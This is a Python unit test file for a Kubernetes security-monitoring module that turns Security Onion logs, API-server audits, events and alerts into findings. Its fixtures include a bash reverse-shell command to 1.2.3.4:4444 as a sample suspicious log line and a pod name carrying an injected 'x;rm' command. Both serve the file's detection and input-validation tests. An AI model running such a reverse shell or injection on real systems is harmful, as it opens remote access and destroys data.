"""Unit tests for k8s.py (Kubernetes security monitoring from Security Onion data)."""
import os, sys; sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__)))); import _env  # noqa: E401,E702,E402

import unittest  # noqa: E402
from unittest import mock  # noqa: E402

import k8s  # noqa: E402

POL = {"signal_exempt": {"opencti": {"kinds": ["miner"], "reason": "threat intel"}}, "exec_alert": 1, "deny_alert": 20}


def sig(kind, sev, ns="apps", pod="web-7d9f8c6b5-abcde", count=3, exempt=""):
    return {"kind": kind, "label": kind, "severity": sev, "ns": ns, "pod": pod, "container": "web", "count": count,
            "examples": ["bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"], "exempt": exempt}


class FindingsTest(unittest.TestCase):
    def setUp(self):
        p = mock.patch.object(k8s, "policy", return_value=POL)
        p.start()
        self.addCleanup(p.stop)

    def keys(self, d, nightly=True):
        return [k for k, _, _ in k8s.findings(d, nightly=nightly)]

    def test_stale_container_logs(self):
        """REQ: KUBE-02"""
        d = {"coverage": [{"dataset": "kubernetes.container_logs", "state": "stale", "last": "2026-11-06T15:17:57Z"}]}
        self.assertEqual(self.keys(d), ["k8s-cov|kubernetes.container_logs"])
        d["coverage"][0]["state"] = "ok"
        self.assertEqual(self.keys(d), [])

    def test_high_signal_investigate_and_exempt(self):
        """REQ: KUBE-02"""
        f = k8s.findings({"signals": [sig("cmd", "high")]})
        self.assertEqual(f[0][1], "Investigate")
        self.assertTrue(f[0][0].startswith("k8s-log|cmd|apps|web|web"))
        self.assertEqual(self.keys({"signals": [sig("miner", "high", ns="opencti", exempt="threat intel")]}), [])
        self.assertEqual(self.keys({"signals": [sig("secret", "medium")]}), ["k8s-log|secret|apps|web|web"])
        self.assertEqual(self.keys({"signals": [sig("denied", "low", count=500)]}, nightly=False), [])  # nightly: an Info event (Open events)

    def test_replicas_share_one_key(self):
        """REQ: KUBE-02"""
        d = {"signals": [sig("cmd", "high", pod="web-7d9f8c6b5-abcde"), sig("cmd", "high", pod="web-7d9f8c6b5-fghij")]}
        self.assertEqual(len(k8s.findings(d)), 1)

    def test_api_exec_and_denied(self):
        """REQ: KUBE-02"""
        a = {"exec": 2, "denied": 25, "rbac_writes": 0, "rows": [{"why": "denied", "verb": "GET", "resource": "secrets", "subresource": "", "code": "403", "count": 25}]}
        self.assertEqual(sorted(self.keys({"apiserver": a})), ["k8s-api|denied", "k8s-api|exec"])
        self.assertEqual(self.keys({"apiserver": dict(a, exec=0, denied=3)}), [])
        self.assertEqual(self.keys({"apiserver": {"error": "x"}}), [])

    def test_events_alerts_images(self):
        """REQ: KUBE-02"""
        d = {"events": [{"security": True, "message": "pods \"x\" is forbidden: violates PodSecurity \"restricted\"", "ns": "apps", "reason": "FailedCreate", "kind": "ReplicaSet", "object": "x-6d4cf56db6"},
                        {"security": False, "message": "Readiness probe failed", "ns": "apps", "reason": "Unhealthy", "kind": "Pod", "object": "y"}],
             "alerts": [{"severity": "high", "rule": "ET EXPLOIT x", "count": 2, "hosts": ["node1"], "src": []}, {"severity": "low", "rule": "ET INFO y", "count": 9, "hosts": [], "src": []}],
             "new_images": ["evil/miner:latest"]}
        self.assertEqual(self.keys(d), ["k8s-ev|apps|FailedCreate|x-6d4cf56db6", "k8s-ev|apps|Unhealthy|y", "k8s-alert|ET EXPLOIT x", "k8s-img|evil/miner:latest"])
        self.assertEqual(self.keys(d, nightly=False), ["k8s-ev|apps|FailedCreate|x-6d4cf56db6", "k8s-alert|ET EXPLOIT x", "k8s-img|evil/miner:latest"])


class HelpersTest(unittest.TestCase):
    def test_exempt(self):
        """REQ: KUBE-02"""
        self.assertEqual(k8s.exempt("opencti", "miner", POL), "threat intel")
        self.assertEqual(k8s.exempt("opencti", "cmd", POL), "")
        self.assertEqual(k8s.exempt("other", "miner", POL), "")
        self.assertTrue(k8s.exempt("ci", "cmd", {"signal_exempt": {"ci": ["*"]}}))

    def test_image_risk_and_stable_pod(self):
        """REQ: KUBE-02"""
        self.assertEqual(k8s.image_risk("nginx"), ["no tag (implicit :latest)"])
        self.assertEqual(k8s.image_risk("registry:5000/app:latest"), [":latest tag"])
        self.assertEqual(k8s.image_risk("ghcr.io/x/y@sha256:abc"), [])
        self.assertEqual(k8s.image_risk("quay.io/calico/node:v3.33.0"), [])
        self.assertEqual(k8s._stable_pod("opencti-worker-5f7c9d8b4-x2k9p"), "opencti-worker")
        self.assertEqual(k8s._stable_pod("calico-node-6lw86"), "calico-node")

    def test_pod_owner(self):
        """REQ: KUBE-12"""
        self.assertEqual(k8s.owner_of({"replicaset": {"name": "opencti-worker-7b7699bc8"}}, "opencti-worker-7b7699bc8-dffkj"), ("deployment", "opencti-worker"))
        self.assertEqual(k8s.owner_of({"deployment": {"name": "web"}, "replicaset": {"name": "web-5f7c9d8b4"}}), ("deployment", "web"))
        self.assertEqual(k8s.owner_of({"statefulset": {"name": "opencti-rabbitmq"}}, "opencti-rabbitmq-0"), ("statefulset", "opencti-rabbitmq"))
        self.assertEqual(k8s.owner_of({"daemonset": {"name": "calico-node"}}, "calico-node-6lw86"), ("daemonset", "calico-node"))
        self.assertEqual(k8s.owner_of({"job": {"name": "backup-29012345"}}), ("cronjob", "backup"))
        self.assertEqual(k8s.owner_of({"job": {"name": "migrate"}}), ("job", "migrate"))
        self.assertEqual(k8s.owner_of({}, "kube-apiserver-n1"), ("pod", "kube-apiserver-n1"))
        f = k8s._owner_filter("deployment", "my.web")
        self.assertEqual(f["bool"]["should"][0], {"regexp": {"kubernetes.pod.name": "my\\.web-[a-z0-9]{1,10}-[a-z0-9]{5}"}})
        self.assertEqual(k8s._owner_filter("pod", "x"), {"term": {"kubernetes.pod.name": "x"}})
        # the finding text names the owner, so the event reviewer and event research file notes on it
        d = {"signals": [{"kind": "cmd", "severity": "high", "label": "Suspicious command", "ns": "apps", "pod": "web-5f7c9d8b4-x2k9p", "container": "c",
                          "count": 1, "examples": ["x"], "owner": "deployment/web", "cluster": "talos"}]}
        txt = k8s.findings(d, nightly=False)[0][2]
        self.assertIn("[talos] (owner deployment/web)", txt)
        import kb
        self.assertEqual(kb.pod_of_event({"eid": "hf|" + k8s.findings(d, nightly=False)[0][0], "label": txt}), ("talos", "apps", "deployment", "web"))

    def test_pod_rejects_bad_owner(self):
        """REQ: KUBE-04"""
        with self.assertRaises(ValueError):
            k8s.pod("apps", "web", owner="widget")

    def test_shard_failure_raises(self):
        """REQ: KUBE-01"""
        with mock.patch.object(k8s, "_esq", return_value={"_shards": {"total": 4, "failed": 1, "failures": [{"reason": {"reason": "bad field"}}]}}):
            with self.assertRaises(RuntimeError):
                k8s.q("x", {})
            self.assertIn("error", k8s.safe(k8s.q, "x", {}))

    def test_only_security_onion(self):
        """REQ: KUBE-01"""
        src = open(k8s.__file__).read()
        for bad in ("kubectl", "kubeconfig", "subprocess", "6443"):  # node names for the cluster filter come via kube_api (read-only, GET)
            self.assertNotIn(bad, src.split('"""', 2)[2])

    def test_pod_rejects_bad_names(self):
        """REQ: KUBE-04"""
        for ns, pod in (("", "a"), ("a b", "x"), ("ok", "x;rm"), ("ok", "")):
            with self.assertRaises(ValueError):
                k8s.pod(ns, pod)

    def test_set_end_window(self):
        """REQ: KUBE-04"""
        k8s.set_end("2026-11-06T15:00:00+00:00")
        try:
            self.assertEqual(k8s.rng(60), {"range": {"@timestamp": {"gte": "2026-11-06T15:00:00Z||-60m", "lte": "2026-11-06T15:00:00Z"}}})
        finally:
            k8s.set_end(None)
        with self.assertRaises(ValueError):
            k8s.set_end("2026-11-06T15:00:00")


class ApiserverTest(unittest.TestCase):
    def test_increase_and_classes(self):
        """REQ: KUBE-03"""
        def b(verb, res, sub, code, mn, mx):
            return {"key": {"verb": verb, "res": res, "sub": sub, "code": code, "comp": "apiserver"}, "mx": {"value": mx}, "mn": {"value": mn}}
        r = {"aggregations": {"restart": {"value": 1}, "s": {"buckets": [
            b("CONNECT", "pods", "exec", "101", 10, 13), b("GET", "secrets", None, "403", 5, 35), b("CREATE", "clusterrolebindings", None, "201", 0, 1),
            b("LIST", "pods", None, "200", 100, 100), b("GET", "secrets", None, "200", 1, 4), b("GET", "nodes", None, "500", 0, 2)]}}}
        with mock.patch.object(k8s, "q", return_value=r):
            a = k8s.apiserver(60)
        self.assertEqual((a["exec"], a["denied"], a["rbac_writes"], a["errors"]), (3, 30, 1, 2))
        self.assertEqual(a["requests"], 3 + 30 + 1 + 3 + 2)
        self.assertEqual({x["why"] for x in a["rows"]}, {"exec", "denied", "rbac", "secrets-read", "error"})


class WatchTest(unittest.TestCase):
    def test_failed_part_is_reported(self):
        """REQ: KUBE-01"""
        with mock.patch.object(k8s, "coverage", return_value=[]), mock.patch.object(k8s, "events", return_value=[]), \
                mock.patch.object(k8s, "apiserver", return_value={"exec": 0, "denied": 0, "rows": []}), \
                mock.patch.object(k8s, "_new_images", return_value=[]), \
                mock.patch.object(k8s, "log_signals", side_effect=RuntimeError("1 of 4 shards failed")):
            f, errs = k8s.watch_findings(20)
        self.assertEqual(f, [])
        self.assertEqual(len(errs), 1)
        self.assertTrue(errs[0].startswith("signals:"))


class CollectMergeTest(unittest.TestCase):
    def test_k8s_into_hosts(self):
        """REQ: KUBE-04"""
        with mock.patch.object(sys, "argv", ["collect.py"]):
            import collect
        out = {"hosts": {"findings": [{"key": "login-new|h|u"}, {"key": "k8s-api|exec"}]},
               "k8s": {"findings": [{"key": "k8s-api|exec"}, {"key": "k8s-img|x"}]}}
        collect._k8s_into_hosts(out)
        self.assertEqual([f["key"] for f in out["hosts"]["findings"]], ["login-new|h|u", "k8s-api|exec", "k8s-img|x"])


if __name__ == "__main__":
    unittest.main()
